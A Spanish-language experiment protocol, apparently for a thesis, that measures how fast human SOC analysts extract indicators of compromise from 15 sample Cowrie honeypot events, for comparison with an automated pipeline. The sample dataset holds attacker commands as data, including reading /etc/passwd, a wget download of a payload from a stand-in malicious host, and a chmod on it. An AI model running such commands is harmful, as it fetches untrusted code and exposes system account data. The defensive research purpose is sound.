# M5 — Protocolo de Medición de Línea Base Manual

> **Objetivo:** Medir con analistas humanos reales el tiempo y la calidad del procesamiento manual de eventos de honeypot, para comparar contra el pipeline automatizado.

---

## 1. Diseño del Experimento

### 1.1 Participantes

| Rol | Cantidad mínima | Perfil requerido |
|-----|----------------|------------------|
| Analista SOC Junior | 1-2 | Estudiante de seguridad/IT con conocimientos básicos de redes y Linux |
| Analista SOC Senior | 1 (deseable) | Profesional o docente con experiencia en análisis de incidentes |

> **Fallback:** Si no hay acceso a profesionales, usar 2-3 compañeros de la carrera que hayan cursado materias de redes o seguridad.

### 1.2 Dataset de Entrada

Preparar un archivo `dataset_m5.json` con **15 eventos crudos** de Cowrie, representativos de un ataque real:

```json
[
  {"eventid": "cowrie.session.connect", "src_ip": "203.0.113.42", "session": "ses001", "timestamp": "2026-09-17T10:30:00Z"},
  {"eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "session": "ses001", "username": "admin", "password": "123456", "timestamp": "2026-09-17T10:30:05Z"},
  {"eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "session": "ses001", "username": "admin", "password": "admin", "timestamp": "2026-09-17T10:30:08Z"},
  {"eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "session": "ses001", "username": "root", "password": "toor", "timestamp": "2026-09-17T10:30:11Z"},
  {"eventid": "cowrie.login.success", "src_ip": "203.0.113.42", "session": "ses001", "username": "admin", "password": "test123", "timestamp": "2026-09-17T10:30:15Z"},
  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "ses001", "input": "whoami", "timestamp": "2026-09-17T10:30:20Z"},
  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "ses001", "input": "uname -a", "timestamp": "2026-09-17T10:30:22Z"},
  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "ses001", "input": "cat /etc/passwd", "timestamp": "2026-09-17T10:30:25Z"},
  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "ses001", "input": "wget http://malware.example.com/payload.sh", "timestamp": "2026-09-17T10:30:30Z"},
  {"eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "session": "ses001", "input": "chmod 777 /tmp/payload.sh", "timestamp": "2026-09-17T10:30:33Z"},
  {"eventid": "cowrie.session.connect", "src_ip": "198.51.100.7", "session": "ses002", "timestamp": "2026-09-17T11:15:00Z"},
  {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.7", "session": "ses002", "username": "root", "password": "password", "timestamp": "2026-09-17T11:15:03Z"},
  {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.7", "session": "ses002", "username": "root", "password": "123456", "timestamp": "2026-09-17T11:15:06Z"},
  {"eventid": "cowrie.session.closed", "src_ip": "198.51.100.7", "session": "ses002", "timestamp": "2026-09-17T11:15:10Z"},
  {"eventid": "cowrie.session.closed", "src_ip": "203.0.113.42", "session": "ses001", "timestamp": "2026-09-17T10:35:00Z"}
]
```

### 1.3 Material para el Evaluador

Cada evaluador recibe:

1. **Hoja de datos:** El `dataset_m5.json` impreso o en pantalla
2. **Plantilla de salida:** Una tabla vacía para registrar IoCs detectados
3. **Cronómetro:** El evaluador controla start/stop
4. **Instrucciones:** El protocolo de este archivo (sección 2)

---

## 2. Protocolo de Ejecución

### 2.1 Briefing (5 minutos)

Explicar al evaluador:

> "Tenés 15 eventos crudos de un honeypot. Tu tarea es analizarlos y extraer todos los Indicadores de Compromiso (IoCs) que encuentres. Un IoC puede ser: una IP maliciosa, una credencial usada, un comando sospechoso, un hash, o una URL/dominio malicioso. Usá el cronómetro para medir tu tiempo."

### 2.2 Formato de Salida

El evaluador completa esta tabla:

| # | Evento (eventid) | IoC Tipo | IoC Valor | Confianza (ALTO/MEDIO/BAJO) | Notas |
|---|------------------|----------|-----------|----------------------------|-------|
| 1 | cowrie.login.failed | credential | admin:123456 | ALTO | Intento de brute force |
| 2 | cowrie.command.input | command | wget http://malware... | ALTO | Descarga de payload |
| ... | ... | ... | ... | ... | ... |

### 2.3 Ejecución (cronometrada)

1. El evaluador inicia el cronómetro
2. Analiza los 15 eventos uno por uno
3. Registra cada IoC en la tabla
4. Detiene el cronómetro al terminar
5. Registra el tiempo total

### 2.4 Debriefing (5 minutos)

Preguntas:
- ¿Cuál fue la parte más difícil del análisis?
- ¿Qué eventos te parecieron ambiguos?
- ¿Qué herramienta o información extra hubieses necesitado?
- ¿Cuánto tiempo dedicás a cada tipo de evento?

---

## 3. Métricas a Capturar

### 3.1 Por Evaluador

| Métrica | Cómo se mide |
|---------|-------------|
| Tiempo total | Cronómetro (segundos) |
| Tiempo promedio por evento | Tiempo total / 15 |
| IoCs totales extraídos | Conteo de la tabla |
| IoCs verdaderos positivos | IoCs que matchean contra el pipeline |
| IoCs falsos positivos | IoCs reportados que no son reales |
| IoCs faltados (false negatives) | IoCs del pipeline que el humano no detectó |
| Cobertura | VP / (VP + FN) × 100 |
| Precisión | VP / (VP + FP) × 100 |

### 3.2 Comparativa vs. Pipeline

| Métrica | Automatizado | Manual (promedio) | Ratio |
|---------|-------------|-------------------|-------|
| Tiempo por evento | ~0.3s (medido en M3) | Xm Ys | Xm Ys / 0.3s |
| IoCs detectados | N (del pipeline) | N (promedio humanos) | — |
| Cobertura | 100% (determinista) | X% | — |
| Falsos positivos | 0 (reglas deterministas) | X | — |

### 3.3 Intervalo de Confianza del Tiempo Manual

Con ≥ 2 evaluadores, calcular:
- **Media** del tiempo por evento
- **Desviación estándar**
- **IC 95%** (t de Student si n < 30)

---

## 4. Plantilla de Registro

### Hoja del Evaluador

```
## Evaluador: [Nombre/Rol]
## Fecha: YYYY-MM-DD
## Inicio: HH:MM:SS
## Fin: HH:MM:SS
## Duración total: Xm Ys

| # | eventid | IoC Tipo | IoC Valor | Confianza | Tiempo estimado (s) |
|---|---------|----------|-----------|-----------|---------------------|
| 1 | | | | | |
| 2 | | | | | |
| ... | | | | | |

## IoCs totales: N
## Observaciones: [texto libre]
```

### Hoja del Investigador (post-experimento)

```
## Resultados M5 — Línea Base Manual

| Evaluador | Rol | Duración total | Tiempo/evento | IoCs detectados | VP | FP | FN | Cobertura | Precisión |
|-----------|-----|---------------|---------------|-----------------|----|----|----|----------|-----------|
| Eval 1 | Junior | Xm Ys | Xs | N | N | N | N | X% | X% |
| Eval 2 | Junior | Xm Ys | Xs | N | N | N | N | X% | X% |
| Eval 3 | Senior | Xm Ys | Xs | N | N | N | N | X% | X% |

### Promedio
- Tiempo por evento: Xm Ys (DS: Xs)
- IC 95% tiempo: [Xs, Ys]
- Cobertura promedio: X%
- Precisión promedio: X%

### Comparativa con pipeline automatizado
- Speedup: Xm Ys / 0.3s = Nx más rápido automatizado
- La automatización detecta X% más IoCs que el promedio humano
```

---

## 5. Material Requerido

| Material | Responsable | Estado |
|----------|-------------|--------|
| `dataset_m5.json` (15 eventos) | Investigador | Pendiente |
| Cronómetro | Cada evaluador | Disponible |
| Hoja de registro (impresa o digital) | Investigador | Pendiente |
| Instrucciones impresas | Investigador | Pendiente |
| Espacio tranquilo para la tarea | Investigador | Pendiente |

---

## 6. Consideraciones Éticas

- Los participantes deben dar consentimiento informado
- Los datos son anonymizados (sin nombres reales en la tesis)
- No hay riesgo: se analizan eventos de un honeypot aislado
- Los participantes pueden retirarse en cualquier momento
- Se compensa su tiempo (café, mate, etc.)
